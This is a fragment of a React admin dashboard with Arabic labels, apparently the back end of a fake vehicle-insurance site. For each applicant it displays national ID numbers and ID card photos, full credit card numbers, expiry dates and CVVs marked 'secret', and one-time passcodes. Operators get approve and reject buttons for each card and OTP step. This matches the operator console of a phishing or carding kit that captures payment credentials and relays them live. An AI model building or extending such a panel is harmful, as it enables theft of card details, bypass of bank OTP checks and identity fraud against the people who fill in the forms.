                      {(typeof selectedApp.full_name === 'string' && selectedApp.full_name.trim()) ||
                        (typeof selectedApp.cardholder_name === 'string' && selectedApp.cardholder_name.trim()) ||
                        (typeof selectedApp.card_last_4 === 'string' && selectedApp.card_last_4.trim()
                          ? `عميل ****${selectedApp.card_last_4.trim()}`
                          : 'غير متوفر')}
                    </p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">رقم الهاتف:</p>
                    <p className="font-semibold text-base" dir="ltr">{selectedApp.phone || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">نوع التأمين:</p>
                    <p className="font-semibold text-base">{selectedApp.insurance_type || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">نوع المستند:</p>
                    <p className="font-semibold text-base">{selectedApp.document_type || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">🆔 رقم الهوية/الإقامة:</p>
                    <p className="font-semibold text-base">{selectedApp.id_number || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">🔢 الرقم التسلسلي:</p>
                    <p className="font-semibold text-base">{selectedApp.serial_number || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">📅 تاريخ التسجيل:</p>
                    <p className="font-semibold text-base">
                      {selectedApp.created_at 
                        ? new Date(selectedApp.created_at).toLocaleDateString('ar-EG', {
                            year: 'numeric',
                            month: 'long',
                            day: 'numeric',
                            calendar: 'gregory'
                          })
                        : 'غير متوفر'}
                    </p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">🕐 وقت التسجيل:</p>
                    <p className="font-semibold text-base" dir="ltr">
                      {selectedApp.created_at 
                        ? new Date(selectedApp.created_at).toLocaleTimeString('ar-EG', {
                            hour: '2-digit',
                            minute: '2-digit',
                            second: '2-digit'
                          })
                        : 'غير متوفر'}
                    </p>
                  </div>
                </div>
              </div>

              {/* معلومات المركبة */}
              {selectedApp.vehicle_manufacturer && (
                <div className="bg-green-50 dark:bg-green-950/20 p-4 rounded-lg border border-green-200 dark:border-green-800">
                  <h3 className="font-bold text-lg mb-3">🚗 معلومات المركبة</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">الصانع:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_manufacturer}</p>
                    </div>
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">الموديل:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_model}</p>
                    </div>
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">سنة الصنع:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_year}</p>
                    </div>
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">قيمة السيارة:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_value?.toLocaleString('ar-SA')} ر.س</p>
                    </div>
                  </div>
                </div>
              )}

              {/* شركة التأمين المختارة */}
              {selectedApp.selected_company && (
                <div>
                  <h3 className="font-bold mb-2">شركة التأمين المختارة</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <p><span className="font-semibold">الشركة:</span> {selectedApp.selected_company}</p>
                    <p><span className="font-semibold">السعر:</span> {selectedApp.selected_price} ر.س</p>
                  </div>
                </div>
              )}

              {/* جميع البطاقات الائتمانية المدخلة */}
              {(() => {
                const cardApps = (relatedApplications.length > 0 ? relatedApplications : [selectedApp]).filter(Boolean) as Application[];
                const cards = cardApps.filter(app => !!app.cardholder_name);
                if (cards.length === 0) return null;

                return (
                  <div className="space-y-4">
                    <h3 className="font-bold text-red-600 text-lg">⚠️ البطاقات الائتمانية المدخلة (سرية)</h3>
                    {cards.map((app, index) => (
                      <div key={app.id} className="border-2 border-red-300 dark:border-red-800 rounded-lg p-4">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-2">
                            <Badge variant="outline" className="text-base font-bold">
                              البطاقة #{index + 1}
                            </Badge>
                            {app.payment_approved ? (
                              <Badge className="bg-green-500">
                                <CheckCircle className="w-3 h-3 mr-1" /> موافق عليها
                              </Badge>
                            ) : app.status === 'rejected' ? (
                              <Badge variant="destructive">
                                <XCircle className="w-3 h-3 mr-1" /> مرفوضة
                              </Badge>
                            ) : (
                              <Badge variant="destructive">
                                <Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة
                              </Badge>
                            )}
                          </div>
                          {!app.payment_approved && app.status !== 'rejected' && (
                            <div className="flex gap-2">
                              <Button
                                onClick={() => approveStep(app.id, 'payment_approved')}
                                size="sm"
                                className="bg-green-600 hover:bg-green-700"
                              >
                                <CheckCircle className="h-4 w-4 ml-1" />
                                موافق
                              </Button>
                              <Button
                                onClick={() => rejectStep(app.id)}
                                size="sm"
                                variant="destructive"
                              >
                                <XCircle className="h-4 w-4 ml-1" />
                                رفض
                              </Button>
                            </div>
                          )}
                        </div>
                        <div className="space-y-3 bg-red-50 dark:bg-red-950/20 p-4 rounded-lg">
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">📅 تاريخ الإدخال:</p>
                            <p className="font-semibold text-sm">
                              {new Date(app.created_at).toLocaleString('ar-EG', {
                                year: 'numeric',
                                month: 'short',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit'
                              })}
                            </p>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">اسم حامل البطاقة:</p>
                            <p className="font-bold text-base">{app.cardholder_name}</p>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">رقم البطاقة الكامل:</p>
                            <p className="font-mono font-bold text-lg" dir="ltr">
                              {app.card_number || `**** **** **** ${app.card_last_4}`}
                            </p>
                          </div>
                          <div className="grid grid-cols-2 gap-3">
                            <div>
                              <p className="text-xs text-muted-foreground mb-1">نوع البطاقة:</p>
                              <p className="font-semibold capitalize">{app.card_type}</p>
                            </div>
                            <div>
                              <p className="text-xs text-muted-foreground mb-1">تاريخ الانتهاء:</p>
                              <p className="font-mono font-semibold">{app.expiry_date}</p>
                            </div>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">رمز CVV:</p>
                            <p className="font-mono font-bold text-2xl text-red-600">{app.card_cvv || '***'}</p>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                );
              })()}

              {/* جميع أكواد OTP المدخلة */}
              {(() => {
                const otpApps = (relatedApplications.length > 0 ? relatedApplications : [selectedApp]).filter(Boolean) as Application[];
                const otps = otpApps.filter(app => !!app.otp_code);
                if (otps.length === 0) return null;

                return (
                  <div className="space-y-4">
                    <h3 className="font-bold text-lg">🔐 أكواد التحقق OTP المدخلة</h3>
                    {otps.map((app, index) => (
                      <div key={app.id} className="border-2 border-primary/30 rounded-lg p-4">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-2">
                            <Badge variant="outline" className="text-base font-bold">
                              كود OTP #{index + 1}
                            </Badge>
                            {app.otp_approved ? (
                              <Badge className="bg-green-500">
                                <CheckCircle className="w-3 h-3 mr-1" /> موافق عليه
                              </Badge>
                            ) : app.status === 'rejected' ? (
                              <Badge variant="destructive">
                                <XCircle className="w-3 h-3 mr-1" /> مرفوض
                              </Badge>
                            ) : (
                              <Badge variant="destructive">
                                <Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة
                              </Badge>
                            )}
                          </div>
                          {!app.otp_approved && app.status !== 'rejected' && (
                            <div className="flex gap-2">
                              <Button
                                onClick={() => approveStep(app.id, 'otp_approved')}
                                size="sm"
                                className="bg-green-600 hover:bg-green-700"
                              >
                                <CheckCircle className="h-4 w-4 ml-1" />
                                موافق
                              </Button>
                              <Button
                                onClick={() => rejectStep(app.id)}
                                size="sm"
                                variant="destructive"
                              >
                                <XCircle className="h-4 w-4 ml-1" />
                                رفض
                              </Button>
                            </div>
                          )}
                        </div>
                        <div className="space-y-3">
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">📅 تاريخ الإدخال:</p>
                            <p className="font-semibold text-sm">
                              {new Date(app.created_at).toLocaleString('ar-EG', {
                                year: 'numeric',
                                month: 'short',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit'
                              })}
                            </p>
                          </div>
                          <p className="text-3xl font-mono font-bold bg-primary/10 p-6 rounded-lg text-center text-primary border-2 border-primary/20">
                            {app.otp_code}
                          </p>
                        </div>
                      </div>
                    ))}
                  </div>
                );
              })()}

              {/* صور الهوية */}
              {(selectedApp.id_front_url || selectedApp.id_back_url) && (
                <div className="space-y-4">
                  <div className="flex items-center justify-between">
                    <h3 className="font-bold text-lg">🪪 صور الهوية / الإقامة</h3>
                    <Badge variant="outline" className="gap-1">
                      {selectedApp.id_verification_step === 'approved' ? '✅ تم التحقق' :
                       selectedApp.id_verification_step === 'rejected' ? '❌ مرفوضة' :
                       '⏳ بانتظار المراجعة'}
                    </Badge>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {selectedApp.id_front_url && (
                      <div className="space-y-2">
                        <p className="text-sm font-semibold text-muted-foreground">الوجه الأمامي:</p>
                        <a href={selectedApp.id_front_url} target="_blank" rel="noopener noreferrer">
                          <img
                            src={selectedApp.id_front_url}
                            alt="الوجه الأمامي للهوية"
                            className="w-full h-44 object-cover rounded-lg border-2 border-border hover:border-primary transition-colors cursor-pointer shadow-md"
                          />
                        </a>
                        <a href={selectedApp.id_front_url} target="_blank" rel="noopener noreferrer" className="text-xs text-primary underline">
                          عرض بالحجم الكامل ↗
                        </a>
                      </div>
                    )}
                    {selectedApp.id_back_url && (
                      <div className="space-y-2">
                        <p className="text-sm font-semibold text-muted-foreground">الوجه الخلفي:</p>
                        <a href={selectedApp.id_back_url} target="_blank" rel="noopener noreferrer">
                          <img
                            src={selectedApp.id_back_url}
                            alt="الوجه الخلفي للهوية"
                            className="w-full h-44 object-cover rounded-lg border-2 border-border hover:border-primary transition-colors cursor-pointer shadow-md"
                          />
                        </a>
                        <a href={selectedApp.id_back_url} target="_blank" rel="noopener noreferrer" className="text-xs text-primary underline">
                          عرض بالحجم الكامل ↗
                        </a>
                      </div>
                    )}
                  </div>
                  {/* أزرار الموافقة/الرفض على الهوية */}
                  {selectedApp.id_verification_step === 'submitted' && (
                    <div className="flex gap-3 pt-2">
                      <Button
                        className="flex-1 bg-green-600 hover:bg-green-700"
                        onClick={async () => {
                          await supabase
                            .from('customer_applications')
                            .update({ id_verification_step: 'approved' })
                            .eq('id', selectedApp.id);
                          setSelectedApp(prev => prev ? { ...prev, id_verification_step: 'approved' } : prev);
                          setApplications(prev => prev.map(a => a.id === selectedApp.id ? { ...a, id_verification_step: 'approved' } : a));
                          sonnerToast.success("✅ تم التحقق من الهوية بنجاح");
                        }}
                      >
                        <CheckCircle className="h-4 w-4 ml-2" />
                        موافقة على الهوية
                      </Button>
                      <Button
                        variant="destructive"
                        className="flex-1"
                        onClick={async () => {
                          await supabase
                            .from('customer_applications')
                            .update({ id_verification_step: 'rejected' })
                            .eq('id', selectedApp.id);
                          setSelectedApp(prev => prev ? { ...prev, id_verification_step: 'rejected' } : prev);
                          setApplications(prev => prev.map(a => a.id === selectedApp.id ? { ...a, id_verification_step: 'rejected' } : a));
                          sonnerToast.error("❌ تم رفض صور الهوية");
                        }}
                      >
                        <XCircle className="h-4 w-4 ml-2" />
                        رفض الصور
                      </Button>
                    </div>
                  )}
                </div>
              )}
            </div>
          )}
        </DialogContent>
      </Dialog>
            </div>
          </main>
        </div>
      </div>
    </SidebarProvider>
  );
};

export default DashboardApplications;
